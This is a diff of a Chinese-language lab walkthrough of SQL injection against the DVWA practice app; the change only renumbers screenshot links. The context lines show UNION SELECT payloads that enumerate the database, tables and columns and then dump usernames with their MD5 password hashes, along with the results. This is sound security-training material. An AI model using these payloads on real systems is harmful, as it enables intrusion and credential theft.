@@ -51,28 +51,28 @@ text
 1' UNION SELECT database(), user()#
 返回：dvwa 和 root@localhost。
 
-![字段](screenshots/5.png)
+![字段](screenshots/6.png)
 
 4. 获取所有表名
 text
 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
 得到表：guestbook, users。
 
-![字段](screenshots/6.png)
+![字段](screenshots/7.png)
 
 6. 获取 users 表的列名
 text
 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
 关键列：user, password。
 
-![字段](screenshots/7.png)
+![字段](screenshots/8.png)
 
 8. 导出用户名和密码
 text
 1' UNION SELECT user, password FROM users#
 结果：
-![字段](screenshots/8.png)
 ![字段](screenshots/9.png)
+
 user	password (MD5)
 admin	5f4dcc3b5aa765d61d8327deb882cf99
 gordonb	e99a18c428cb38d5f260853678922e03
